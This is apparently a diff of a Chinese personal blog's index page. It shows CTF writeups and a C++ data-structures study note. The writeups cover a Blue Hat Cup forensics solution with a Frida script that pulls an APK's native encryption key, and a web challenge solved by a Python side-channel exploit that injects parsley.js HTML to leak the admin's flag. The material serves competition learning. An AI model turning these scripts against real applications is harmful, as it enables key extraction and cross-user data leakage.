+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230926172105.png"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230926172130.png"></li>
+</ol>
+<h2 id="转载题目"><a href="#转载题目" class="headerlink" title="转载题目"></a>转载题目</h2><ol>
+<li>  <a target="_blank" rel="noopener" href="https://blog.zeddyu.info/2020/01/08/36c3-web/#writeupbin">36c3 Web 学习记录 (zeddyu.info)</a></li>
+</ol>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B_%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/">
+                蓝帽杯半决赛wp_电子取证部分
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2023-09-16</span>
+            
+            
+                <a href="http://dezhoutorizhao.github.io/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B_%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/#disqus_thread" class="comments article-comment-link">留言</a>
+            
+            
+                <span class="category">
+                    <a href="/categories/CTF/">CTF</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="大王毕盛——电子取证"><a href="#大王毕盛——电子取证" class="headerlink" title="大王毕盛——电子取证"></a>大王毕盛——电子取证</h1><h2 id="取证1"><a href="#取证1" class="headerlink" title="取证1"></a>取证1</h2><ol>
+<li>  检材数据开始提取是今年什么时候？</li>
+<li>  在logs.txt中，直接找到时间：09-11 17:20</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230916212902.png"></li>
+</ol>
+<h2 id="取证2"><a href="#取证2" class="headerlink" title="取证2"></a>取证2</h2><ol>
+<li>  嫌疑人手机SD卡存储空间一共多少GB？（答案格式： 22.5）</li>
+<li>  logs.txt中显示SD卡总空间24.32GB</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230916213108.png"></li>
+</ol>
+<h2 id="取证3"><a href="#取证3" class="headerlink" title="取证3"></a>取证3</h2><ol>
+<li>  嫌疑人手机设备名称是？（答案格式：adfer）</li>
+<li>  设备名称：sailfish</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230916213135.png"></li>
+</ol>
+<h2 id="取证4"><a href="#取证4" class="headerlink" title="取证4"></a>取证4</h2><ol>
+<li>  嫌疑人手机IMEI是？（答案格式：3843487568726387）</li>
+<li>  取证软件导入华为备份文件夹检材后找到IMEI：352531082716257</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230916213200.png"></li>
+</ol>
+<h2 id="取证5"><a href="#取证5" class="headerlink" title="取证5"></a>取证5</h2><ol>
+<li>  嫌疑人手机通讯录数据存放在那个数据库文件中？（答案格式：call.db）</li>
+<li>  在所有数据库文件中搜索到contacts.db</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230916213229.png"></li>
+</ol>
+<h2 id="取证6"><a href="#取证6" class="headerlink" title="取证6"></a>取证6</h2><ol>
+<li>  嫌疑人手机一共使用过多少个应用？（答案格式：22）</li>
+<li>  在日志中看到一共使用过100个应用，填的100</li>
+</ol>
+<h2 id="取证7"><a href="#取证7" class="headerlink" title="取证7"></a>取证7</h2><ol>
+<li>  测试apk的包名是？（答案格式：con.tencent.com）</li>
+<li>  取证软件中看到apk目录安装名</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230916213405.png"></li>
+</ol>
+<h2 id="取证8"><a href="#取证8" class="headerlink" title="取证8"></a>取证8</h2><ol>
+<li>  测试apk的签名算法是？（答案格式:AES250）</li>
+<li>  jadx反编译后去签名文件找：SHA256withRSA</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230916213442.png"></li>
+</ol>
+<h2 id="取证9"><a href="#取证9" class="headerlink" title="取证9"></a>取证9</h2><ol>
+<li>  测试apk的主入口是？（答案格式：com.tmp.mainactivity）</li>
+<li>  去清单文件找LUANCH，结果为com.example.myapplication.MainActivity</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230916213520.png"></li>
+</ol>
+<h2 id="取证10"><a href="#取证10" class="headerlink" title="取证10"></a>取证10</h2><ol>
+<li>  测试apk一共申请了几个权限？（答案格式：7）</li>
+<li>  取证分析一共三个permission，即三个权限</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230916213602.png"></li>
+</ol>
+<h2 id="取证11"><a href="#取证11" class="headerlink" title="取证11"></a>取证11</h2><ol>
+<li>  测试apk对Calllog.txt文件内的数据进行了什么加密？（答案格式：DES）</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230916213636.png"></li>
+<li>  Base64.encodeToString，即Base64加密</li>
+</ol>
+<h2 id="取证12"><a href="#取证12" class="headerlink" title="取证12"></a>取证12</h2><ol>
+<li>  10086对嫌疑人拨打过几次电话？（答案格式：5）</li>
+<li>  在文件里搜索Calllog.txt,Base64解密</li>
+<li>  找10086的通话记录，发现是2次</li>
+</ol>
+<h2 id="取证13"><a href="#取证13" class="headerlink" title="取证13"></a>取证13</h2><ol>
+<li>  测试apk对短信记录进行了几次加密？（答案格式：5）</li>
+<li>  短信加密的函数中，先进行了AES加密，后进行了Base64加密，因此是2次。</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230916213830.png"></li>
+</ol>
+<h2 id="取证14"><a href="#取证14" class="headerlink" title="取证14"></a>取证14</h2><ol>
+<li><p>  测试apk对短信记录进行加密的秘钥是？（答案格式：slkdjlfslskdnln）</p>
+</li>
+<li><p>  加密密钥是通过JNI调用so层函数得到的，直接使用frida-hook主动调用jni函数获取返回值</p>
+</li>
+<li><pre><code>  function main() &#123;
+      Java.perform(function () &#123;
+          var libJniTest_addr = Module.findBaseAddress(&quot;libmyapplication.so&quot;)
+          console.log(&quot;libJniTest 地址：&quot;, libJniTest_addr);
+          if (libJniTest_addr) &#123;
+              var func_sayHello_addr = 
+  Module.findExportByName(&quot;libmyapplication.so&quot;, 
+  &quot;Java_com_example_myapplication_MainActivity_Getkey&quot;);
+              console.log(&quot;Java_com_jwxdxnx06_myJNI_sayHello 地址：&quot;, 
+  func_sayHello_addr);
+              // 主动调用
+              //创建新函数,参数1：函数地址，参数2：返回值类型，参数3：函数参数类型
+              var func = new NativeFunction(func_sayHello_addr, &#39;pointer&#39;, 
+  [&#39;pointer&#39;])
+              // 通过Java.vm获得env
+              var retVal = func(Java.vm.getEnv())
+              var ret = Java.vm.getEnv().getStringUtfChars(retVal, 
+  null).readCString();
+              console.log(ret)
+         &#125;
+     &#125;)
+  &#125;
+  setTimeout(main)
+</code></pre>
+</li>
+<li><p>  上面为Frida主动调用脚本</p>
+</li>
+</ol>
+<h2 id="取证15"><a href="#取证15" class="headerlink" title="取证15"></a>取证15</h2><ol>
+<li>  嫌疑人在2021年登录支付宝的验证码是？（答案格式：3464）</li>
+<li>  在Cyberchef中先Base64解码，然后做一次AES即可得到结果</li>
+<li>  Key是取证第14题的结果，IV根据init函数可知是AES的结果</li>
+<li>  最后Hex解密得到明文，分析明文发现就一个支付宝验证码：9250</li>
+</ol>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B_web/">
+                蓝帽杯半决赛wp_web部分
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2023-09-16</span>
+            
+            
+                <a href="http://dezhoutorizhao.github.io/%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B_web/#disqus_thread" class="comments article-comment-link">留言</a>
+            
+            
+                <span class="category">
+                    <a href="/categories/CTF/">CTF</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h2 id="ArticleShare"><a href="#ArticleShare" class="headerlink" title="ArticleShare"></a>ArticleShare</h2><ol>
+<li><p>  在前端代码中得知：side channel attack</p>
+</li>
+<li><p>  exp如下</p>
+</li>
+<li><p>```<br>  import requests<br>  import time<br>  import sys</p>
+<p>  def main(host, port):</p>
+<pre><code>  s = requests.Session()
   base_url = f&quot;http://&#123;host&#125;:&#123;port&#125;/&quot;
   res = s.get(base_url)
   pos = res.text.find(&#39;name=&quot;c&quot; value=&quot;&#39;) + len(&#39;name=&quot;c&quot; value=&quot;&#39;)
@@ -233,42 +843,648 @@
 
   for i in range(16):
       for j in ss:
-          ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" title="数据结构">数据结构</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-08-30T08:37:08.678Z" title="发表于 2023-08-30 16:37:08">2023-08-30</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/">数据结构</a></span></div><div class="content">线性表
-  声明结构体用typedef
+          print(&quot;trying&quot;,j)
+          payload = f&#39;&#39;&#39;&lt;form data-parsley-validate&gt;
+                    &lt;input data-parsley-required
+                    data-parsley-trigger=\&quot;blur\&quot;
+                    data-parsley-error-message=\&quot;&lt;input type=button id=like&gt;\&quot;
+                    data-parsley-errors-container=\&quot;a[href^=\&#39;/lookup.php?id=&#123;flag + j&#125;\&#39;]\&quot;
+                    autofocus&gt;
+                    &lt;/form&gt;&#39;&#39;&#39;
+          data = &#123;&#39;c&#39;: csrftoken, &#39;content&#39;: payload&#125;
+          res = s.post(base_url + &quot;add.php&quot;, data=data, allow_redirects=False)
+          #print(res.headers)
+          location = res.headers[&#39;Location&#39;]
+          pos = location.find(&#39;id=&#39;) + 3
+          wp = location[pos:]
+          data = &#123;&#39;c&#39;: csrftoken, &#39;id&#39;: wp&#125;
+          res = s.post(base_url + &quot;admin.php&quot;, data=data)
+          time.sleep(10)
 
-  静态分配方式用静态数组
+          res = s.get(f&quot;http://&#123;host&#125;:&#123;port&#125;/lookup.php?id=&#123;wp&#125;&quot;)
+          txt = res.text.replace(&quot;\n&quot;, &quot;&quot;).replace(&quot;\r&quot;, &quot;&quot;)
+          if &quot;Liked by&lt;/h3&gt;admin&quot; not in txt:
+              flag += j
+              print(i,flag)
+              break
+</code></pre>
+<p>  if <strong>name</strong> == ‘<strong>main</strong>‘:</p>
+<pre><code>  main(&quot;********&quot;,&quot;*****&quot;)
+</code></pre>
+  <pre class="line-numbers language-none"><code class="language-none">
+4.   如果中间出现没爆出来的就把前面爆出来的几位去掉最后一位，然后添加在flag前面继续爆就行
 
-  length存放顺序表的当前长度
+5.   flag如下
 
-  线性表要存放 数据元素 和 顺序表当前长度
+6.   &#96;&#96;&#96;
+     ctf&#123;s1d3_ch4nn3l_attack_is_funny_bluecup2023_got_it&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
 
-可以理解为一个数据域：数据元素   和  一个指针域：顺序表当前长度
-  typedef struct &#123;
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/">
+                数据结构
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2023-08-30</span>
+            
+            
+                <a href="http://dezhoutorizhao.github.io/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#disqus_thread" class="comments article-comment-link">留言</a>
+            
+            
+                <span class="category">
+                    <a href="/categories/数据结构/">数据结构</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="线性表"><a href="#线性表" class="headerlink" title="线性表"></a>线性表</h1><ol>
+<li><p>  声明结构体用typedef</p>
+</li>
+<li><p>  静态分配方式用静态数组</p>
+</li>
+<li><p>  length存放顺序表的当前长度</p>
+</li>
+<li><p>  线性表要存放 数据元素 和 顺序表当前长度</p>
+</li>
+<li><p>可以理解为一个数据域：数据元素   和  一个指针域：顺序表当前长度</p>
+  <pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">typedef struct &#123;
 	int data[MaxSize];
 	int length;
-&#125;SqList;
-  结构体变量作函数参数时，用引用
-
-  初始化线性表时，第一，要把每个元素都赋值为0；第二，要把线性表的长度赋值为0
-
-```c++  void Init(SqList &amp;L) {
-  for(int i = 0;i &lt; MaxSize;i++) &#123;
+&#125;SqList;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li>
+<li><p>  结构体变量作函数参数时，用引用</p>
+</li>
+<li><p>  初始化线性表时，第一，要把每个元素都赋值为0；第二，要把线性表的长度赋值为0</p>
+</li>
+<li><p>```c++<br>  void Init(SqList &amp;L) {</p>
+<pre><code>  for(int i = 0;i &lt; MaxSize;i++) &#123;
       L.data[i] = 0;
   &#125;
   L.length = 0;
-
-  }
-  
+</code></pre>
+<p>  }</p>
+  <pre class="line-numbers language-none"><code class="language-none">
 9.   在main函数中的初始化
 
 10.   &#96;&#96;&#96;c++
       int main(void) &#123;
-      	SqList L; &#x2F;&#x2F;初始化一个结构体变量，用类型 名称来写 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/LovePHP/" title="Ciscn初赛——LovePHP题目wp">Ciscn初赛——LovePHP题目wp</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-08-27T09:05:19.259Z" title="发表于 2023-08-27 17:05:19">2023-08-27</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a></span></div><div class="content">LovePHP
-  PHP特性题目
+      	SqList L; &#x2F;&#x2F;初始化一个结构体变量，用类型 名称来写，int a一样
+      	InitList(L);
+      &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+<li><p>  插入元素，头插法</p>
+</li>
+<li><p>  插入的位置后，从后往前，前一个元素往后挪一个位置，为待插入的元素留出空间</p>
+</li>
+<li><p>  注意下标的起始，线性表从1开始，而数组下标从0开始。操作数 i 是从1开始，存到数组中应该是从 i-1 开始</p>
+</li>
+<li><p>  插入元素一共要提供三个参数：<strong>插入的线性表，插入的位置，插入的元素值</strong></p>
+</li>
+<li><p>```c++<br>  void ListInsert(SqList &amp;L,int i,int e) {</p>
+<pre><code>  for(int j = L.length;j &gt;= i;j--) &#123; 
+      // 插入第i-1号位置，所以要从i到Length末尾都要后移一位
+      L.data[j] = L.data[j-1];
+  &#125;
+  L.data[i-1] = e;
+  L.length++;
+</code></pre>
+<p>  }</p>
+  <pre class="line-numbers language-none"><code class="language-none">
+16.   插入元素应该加上对插入位置的判断
 
-  引发服务器500错误，观察PHP过滤器的行为，创建过滤器链进行攻击
+17.   合法的插入范围是1-&gt;length+1,即数组中的0-&gt;length; length+1是添加到末尾的后一个位置
 
-  import requests
+18.   &#96;&#96;&#96;c++
+      bool ListInsert(SqList &amp;L,int i,int e) &#123;
+      	if(i &lt; 1 || i &gt; length+1) return false;
+      	if(L.length &gt;&#x3D; MaxSize) return false;
+      	for(int j &#x3D; L.length;j &gt;&#x3D; i;j--) &#123;
+      		L.data[j] &#x3D; L.data[j-1];
+      	&#125;
+      	L.data[i-1] &#x3D; e;
+      	L.length++;
+      	return true;
+      &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+<li><p>  按值查找，一个一个地比较</p>
+</li>
+<li><p>  一定要明确循环的是什么，这个地方循环的是数组下标,而不是线性表的实际位置，从0-&gt;length</p>
+</li>
+<li><p>```c++<br>  int LocateElem(SqList &amp;L,int e) {</p>
+<pre><code>  for(int i = 0;i &lt; length;i++) &#123;
+      if(L.data[i] == e) return i+1; // 返回的是线性表中的实际位置，数组下标+1
+  &#125;
+  return -1;
+</code></pre>
+<p>  }</p>
+  <pre class="line-numbers language-none"><code class="language-none">
+22.   线性表是随机存取，不需要一个一个地比较，直接根据数组下标去寻找即可
+
+23.   &#96;&#96;&#96;c++
+      int GetElem(SeqList &amp;L,int i) &#123; &#x2F;&#x2F;传入的是线性表的位置
+      	return data[i-1]; &#x2F;&#x2F;返回的是数组中的位置对应的数据，要-1
+      &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+<li><p>  线性表元素删除</p>
+</li>
+<li><p>```c++<br>  bool ListDelete(SeqList &amp;L,int i,int &amp;e) {</p>
+<pre><code>  if(i &lt; 1||i &gt; L.length) &#123; //给出的删除位置为线性表的位置1-length，而不是数组下标
+      return false; // 首先判断要删除的元素是否合法
+  &#125;
+  e=L.data[i-1]; //将要被删除的元素赋值给e，后面返回
+  for(int j = i;j &lt; L.length;j++) &#123;
+      L.data[j-1] = L.data[j]; //将删除元素后面的元素，从后往前移动
+  &#125;
+  L.length--; //别忘记修改指针域，即length
+  return true;
+</code></pre>
+<p>  }</p>
+  <pre class="line-numbers language-none"><code class="language-none">
+26.   动态拓展内存空间
+
+27.   初始化动态空间的线性表时，用malloc
+
+28.   malloc返回的是一个指针，指向了多大的内存空间的地址
+
+29.   malloc返回的内存空间指针指向线性表的数据域
+
+30.   &#96;&#96;&#96;c++
+      #define InitSize 10
+      typedef struct &#123;
+      	int *data; &#x2F;&#x2F;数据域用指针
+      	int MaxSize;
+      	int length;
+      &#125;SeqList;
+      
+      void InitList(SeqList &amp;L) &#123;
+      	L.data&#x3D;(int*)malloc(InitSize*sizeof(int)); &#x2F;&#x2F; malloc的参数是，多少个元素*每个元素的大小
+          L.length &#x3D; 0;
+          L.MaxSize &#x3D; InitSize;
+      &#125;
+      
+      void IncreaseSize(SeqList &amp;L,int len) &#123; &#x2F;&#x2F; 传入两个参数，一个是哪个线性表，另一个是拓展多长的内存空间
+          int *p &#x3D; L.data; &#x2F;&#x2F;扩展内存空间时，先用一个指针指向原有的指针，作为备份
+          L.data  &#x3D; (int*)malloc((L.MaxSize+len) * sizeof(int));
+          &#x2F;&#x2F;给L重新申请一段更大的内存空间，相当于清零
+          for(int i &#x3D; 0;i &lt; L.length;i++) &#123;
+              L.data[i] &#x3D; p[i]; &#x2F;&#x2F;将原有的p指针指向的内存空间元素依次赋值给新地址L
+          &#125;
+          L.MaxSize &#x3D; L.MaxSize + len;
+          free(p);
+      &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h1 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h1><h1 id="单链表是next指针，二叉树是左右孩子lchild和rchild"><a href="#单链表是next指针，二叉树是左右孩子lchild和rchild" class="headerlink" title="单链表是next指针，二叉树是左右孩子lchild和rchild"></a>单链表是next指针，二叉树是左右孩子lchild和rchild</h1><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230831124933.png"></p>
+<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">typedef struct LNode &#123;
+	ElemType data;
+	struct LNode *next;
+&#125;LNode,*LinkList;
+&#x2F;&#x2F;相当于typedef struct LNode&#123;&#125; LNode;与typedef struct LNode&#123;&#125; *LinkList;
+typedef struct LNode LNode;
+typedef struct LNode *LinkList;
+
+typedef struct LNode &#123;
+    ElemType data;
+    struct LNode *next;
+&#125;LNode,*LinkList;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ol>
+<li><p>  LNode * L 与 LinkList L效果相同，都是声明一个指向单链表第一个节点的指针</p>
+</li>
+<li><p>  强调这是一个单链表，用LinkList</p>
+</li>
+<li><p>  强调这是一个节点，用LNode *</p>
+</li>
+<li><p>```c++<br>  typedef struct LNode {</p>
+<pre><code>  int data;
+  struct LNode * next;
+</code></pre>
+<p>  }LNode,*LinkList;</p>
+<p>  typedef struct LNode {</p>
+<pre><code>  int data;
+  struct LNode *next; //不要忘记在定义next指针时，用struct关键字，struct LNode *next，定义同类型内部指针时，要带struct,struct LNode* next;
+</code></pre>
+<p>  }LNode,*LinkList;</p>
+  <pre class="line-numbers language-none"><code class="language-none">     
+5.   &#96;&#96;&#96;c++
+     typedef struct LNode &#123;
+     	int data;
+     	struct LNode *next;
+     &#125;LNode,*LinkList;
+     
+     &#x2F;&#x2F;初始化一个单链表，带头节点
+     bool InitList(LinkList &amp;L) &#123;
+         L &#x3D; (LNode *)malloc(sizeof(LNode)); &#x2F;&#x2F; 分配一个头节点
+         if(L &#x3D;&#x3D; NULL) &#123; &#x2F;&#x2F;如果申请后，L仍为NULL，则内存不足，申请失败
+             return false;
+         &#125;
+         L -&gt; next &#x3D; NULL; &#x2F;&#x2F;头节点之后暂时还没有节点
+         return true;
+     &#125;
+     
+     bool Empty(LinkList L) &#123;
+         if(L -&gt; next &#x3D;&#x3D; NULL) return true; &#x2F;&#x2F;头指针指向头节点，如果头指针的下一个为空，则单链表为空
+         return false;
+     &#125;
+     
+     void test() &#123;
+         LinkList L;
+         InitList(L);
+     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+<li><p>  malloc返回的是一个指针，需要强制类型转换为对应指针类型，传入的参数是多少个元素*每个元素的大小</p>
+</li>
+<li><p>  带头节点的单链表 1. 申请一个节点大小的内存空间 2.判断L是否为NULL，内存够不够 3.将头节点的下一个节点地址域指向空 4.如果申请成功，返回true</p>
+</li>
+<li><p>  在第i个位置插入元素e</p>
+</li>
+<li><p>```c++<br>  bool ListInsert(LinkList &amp;L,int i,int e) {</p>
+<pre><code>  if(i &lt; 1) return false;
+  LNode *p; //指针p指向当前扫描到的节点
+  int j = 0; //循环变量，用来判断当前是第几个节点
+  p = L; //初始状态下，L指向头节点，头节点是第0个节点
+  while(p!=NULL &amp;&amp; j &lt; i-1) &#123; //p不是空，说明没循环到末尾，j&lt;i-1说明还没有循环到第i-1个位置
+      p = p-&gt;next;
+      j++;
+  &#125;
+  if(p == NULL) &#123; //循环到末尾也没有找到，返回false
+      return false;
+  &#125;
+  LNode *s = (LNode *)malloc(sizeof(LNode)); //重新开辟一个节点的内存大小,申请的是节点的指针
+  s -&gt; data = e;
+  s -&gt; next = p -&gt; next;
+  p -&gt; next = s;
+  return true;
+</code></pre>
+<p>  }<br>  // 1.判断插入位置是否合法<br>  // 2.声明循环指针p指向当前扫描到的节点，循环变量j判断当前是第几个节点，这里p强调是一个节点，所以用LNode *<br>  // 3.初始状态下，循环指针p指向头指针<br>  // 4.循环指针后移，直到移动到循环变量j和i-1相等且没到末尾<br>  // 5.循环到末尾也没找到，p==NULL,返回false<br>  // 6.申请一个节点大小的内存单元s，申请的是节点的指针<br>  // 7.改变s和p指针的指向关系<br>  // 8.成功返回true</p>
+<p>  //单链表的插入操作，需要一个循环变量计数和一个循环指针，去找到应该循环d</p>
+  <pre class="line-numbers language-none"><code class="language-none">     
+10.   p指针后移： p &#x3D; p-&gt; next; 下一个指针的地址域赋给上一个，令上一个节点后移一个单位
+
+11.   删除节点：首先要找到第i-1个节点，将其指针指向第i+1个节点，并释放第i个节点 
+
+12.   &#96;&#96;&#96;c++
+      bool ListDelete(LinkList &amp;L,int i,ElemType e) &#123;
+      	if(i &lt; 1) return false;
+          LNode *p;
+          int j &#x3D; 0;
+          p &#x3D; L;
+          while(p !&#x3D; NULL &amp;&amp; j &lt; i-1) &#123; &#x2F;&#x2F;删除第i-1后面的第i号节点的位置
+              p &#x3D; p -&gt; next;
+              j++;
+          &#125;
+          if(p &#x3D;&#x3D; NULL) &#123;
+              return false;
+          &#125;
+          if(p -&gt; next &#x3D;&#x3D; NULL) &#123; &#x2F;&#x2F;第i-1号节点后面再无节点
+              return false;
+          &#125;
+          LNode *q &#x3D; p -&gt; next; &#x2F;&#x2F;令指针q指向被删除节点，p循环到删除节点的上一个节点
+          e &#x3D; q -&gt; data;
+          p-&gt;next &#x3D; q -&gt; next;
+          free(q);
+          return true;
+      &#125;
+      &#x2F;&#x2F; 1. 找位置
+      &#x2F;&#x2F; 2. 改节点，将被删除节点的上一个节点的next指针指向被删除节点的next
+      &#x2F;&#x2F; 3. 释放内存，将被删除节点的内存释放掉<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+<li><p>  单链表求长度</p>
+</li>
+<li><p>```c++<br>  int length(LinkList &amp;L) {</p>
+<pre><code>  int len = 0;
+  LNode *p = L; //将循环指针p指向头节点L
+  while(p -&gt; next != NULL) &#123; //带头节点，头节点不算入长度的话
+      p = p -&gt; next;
+      len ++;
+  &#125;
+  return len;
+</code></pre>
+<p>  }</p>
+<p>  int length(LinkList &amp;L) {</p>
+<pre><code>  int len = 0;
+  LNode *p = L -&gt; next; //跳过头节点
+  while(p != NULL) &#123;
+      p = p -&gt; next;
+  &#125;
+  return len;
+</code></pre>
+<p>  }</p>
+  <pre class="line-numbers language-none"><code class="language-none">
+15.   尾插法建立单链表
+
+16.   &#96;&#96;&#96;c++
+      LinkList List_TailInsert(LinkList &amp;L) &#123;
+      	int x;
+      	L &#x3D; (LinkList)malloc(sizeof(LNode));
+          LNode *s,*r &#x3D; L;
+          scanf(&quot;%d&quot;,&amp;x);
+          while(x !&#x3D; 9999) &#123;
+              s &#x3D; (LNode*)malloc(sizeof(LNode));
+              s -&gt; data &#x3D; x;
+              r -&gt; next &#x3D; s;
+              r &#x3D; s;
+              scanf(&quot;%d&quot;,&amp;x);
+          &#125;
+      	r -&gt; next &#x3D; NULL;
+          return L;
+      &#125;
+      &#x2F;&#x2F; 后插操作
+      &#x2F;&#x2F; 1. 将指针r指向要插入节点的上一个位置
+      &#x2F;&#x2F; 2. 申请插入节点s并赋值
+      &#x2F;&#x2F; 3. r的next指针指向s
+      &#x2F;&#x2F; 4. r后移一步指向s，为下一步的操作做准备
+      &#x2F;&#x2F; 最后将最后一个节点的nextz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h1 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h1><h2 id="顺序存储"><a href="#顺序存储" class="headerlink" title="顺序存储"></a>顺序存储</h2><ol>
+<li>  几个常考的基本操作</li>
+<li>  i的左孩子</li>
+<li>  i的右孩子</li>
+<li>  i的父节点</li>
+<li>  i所在的层次</li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230831152119.png"></li>
+<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230831152241.png"></li>
+<li>  二叉树的顺序存储中，一定要把二叉树的节点编号和完全二叉树一一对应起来</li>
+</ol>
+<h2 id="链式存储"><a href="#链式存储" class="headerlink" title="链式存储"></a>链式存储</h2><h3 id="二叉链表"><a href="#二叉链表" class="headerlink" title="二叉链表"></a>二叉链表</h3><ol>
+<li>  找到节点p的左右孩子节点时间复杂度低</li>
+<li>  但是找某个节点的父节点，只能从根节点开始遍历</li>
+</ol>
+ <pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">struct ElemType &#123;
+    int value;
+&#125;
+typedef struct BiTNode &#123;
+    ElemType data; &#x2F;&#x2F;数据域
+    struct BiTNode *lchild,*rchild; &#x2F;&#x2F;指针域
+&#125;BiTNode,*BiTree; &#x2F;&#x2F;节点和树根节点的指针
+&#x2F;&#x2F;BiTNode* 和 BiTree等价，但是侧重方面不同
+
+&#x2F;&#x2F;定义一棵空树
+&#x2F;&#x2F;声明一个指向根节点的指针，初始为NULL
+BiTree root &#x3D; NULL;
+
+&#x2F;&#x2F;插入根节点
+root &#x3D; (BiTree)malloc(sizeof(BiTNode));
+root -&gt; data &#x3D; &#123;1&#125;;
+root -&gt; lchild &#x3D; NULL;
+root -&gt; rchild &#x3D; NULL;
+
+&#x2F;&#x2F;插入新节点
+BiTNode *p &#x3D; (BiTNode*)malloc(sizeof(BiTNode));
+p -&gt; data &#x3D; &#123;2&#125;;
+p -&gt; lchild &#x3D; NULL;
+p -&gt; rchild &#x3D; NULL;
+root -&gt; lchild &#x3D; p; &#x2F;&#x2F;作为根节点的左孩子节点
